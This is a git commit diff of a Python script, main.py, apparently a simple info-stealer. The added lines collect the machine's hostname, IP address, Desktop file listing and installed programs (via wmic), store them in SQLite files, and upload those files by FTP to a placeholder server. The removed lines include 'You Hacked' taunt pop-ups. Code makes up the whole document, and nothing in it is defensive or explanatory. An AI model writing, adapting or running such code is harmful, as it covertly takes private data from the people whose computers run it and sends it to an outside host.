589f7f70c5dc7e8b8a956d4069b0b46058cc33e5
anf555 <104631818+anf555@users.noreply.github.com>
2022-10-06 20:31:31 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,30 +1,49 @@
 import ftplib
 import socket
 import sqlite3
-from tkinter import messagebox
 import random
+import os
+import subprocess
 
 hostname = socket.gethostname()
 IPAddress = socket.gethostbyname(hostname)
-print(hostname)
-print(IPAddress)
 numbers = "1234567890"
 
+desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+desktoplistdir = os.listdir(desktop)
 conn = sqlite3.connect('database.db')
 c = conn.cursor()
-c.execute('CREATE TABLE IF NOT EXISTS data(ip TEXT, hostname TEXT)')
-c.execute("INSERT INTO data(ip, hostname) VALUES(?, ?)", [IPAddress, hostname])
+c.execute('CREATE TABLE IF NOT EXISTS data(dataname TEXT, value TEXT)')
+c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["hostname", hostname])
+c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["ip address", IPAddress])
+c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["desktop list directory", str(desktoplistdir)])
 conn.commit()
 c.close()
 conn.close()
 
-#session = ftplib.FTP('server.address.com','username','password')
-#file = open('file.png','rb')
-randnum = randompassword = ( ''.join(random.choices(numbers, k=20)))
-print('STOR database' + randnum + '.db')
-#session.storbinary('STOR database' + randnum + '.db', file)
-#file.close()
-#session.quit()
+session = ftplib.FTP('server.address.com','username', 'password')
+file = open('database.db','rb')
+randnum = ( ''.join(random.choices(numbers, k=20)))
+session.storbinary('STOR database' + randnum + '.db', file)
+file.close()
+session.quit()
 
-messagebox.showinfo("You Hacked!!", "You Hacked hahahahahahah")
-messagebox.showinfo("You Hacked!!", "Thanks For The Data hahaha")
+Data = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)
+strdt = str(Data)
+conn = sqlite3.connect('appdatabase.db')
+c = conn.cursor()
+c.execute('CREATE TABLE IF NOT EXISTS data(dataname TEXT, value TEXT)')
+try:
+	for i in range(len(strdt)):
+		c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["app", strdt.split("\\r\\r\\n")[6:][i]])
+
+except IndexError as e:
+        conn.commit()
+        c.close()
+        conn.close()
+        session = ftplib.FTP('server.address.com','username', 'password')
+        file = open('appdatabase.db','rb')
+        randnum = ( ''.join(random.choices(numbers, k=20)))
+        session.storbinary('STOR appdatabase' + randnum + '.db', file)
+        file.close()
+        session.quit()
